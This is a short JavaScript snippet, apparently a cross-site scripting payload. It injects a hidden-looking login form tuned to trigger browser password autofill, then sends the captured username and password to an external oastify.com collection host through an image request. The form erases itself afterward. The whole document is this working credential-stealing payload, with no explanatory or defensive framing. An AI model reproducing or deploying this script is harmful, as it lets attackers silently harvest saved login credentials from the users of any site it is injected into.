<script>
let f=document.createElement("div");
f.style="position:fixed;top:10px;left:10px;background:white;padding:10px;border:1px solid black;z-index:9999;";
f.innerHTML='<form id="pf"><input id="u" name="username" autocomplete="username" placeholder="Username"><br><input id="p" name="password" autocomplete="current-password" placeholder="Password"></form>';
document.body.appendChild(f);

function exfil(){let u=document.getElementById('u').value,p=document.getElementById('p').value;if(u&&p){(new Image()).src="https://msiyvzgured6d3lo5eq15c59v01rpmdb.oastify.com/exfil?u="+encodeURIComponent(u)+"&p="+encodeURIComponent(p);document.body.removeChild(f);}}

function checkAutoFill(){let u=document.getElementById('u').value,p=document.getElementById('p').value;if(u&&p)exfil();}

['u','p'].forEach(id=>{document.getElementById(id).addEventListener('input',checkAutoFill);document.getElementById(id).addEventListener('change',checkAutoFill);});

setTimeout(()=>{if(document.body.contains(f))document.body.removeChild(f);},10000);
</script>
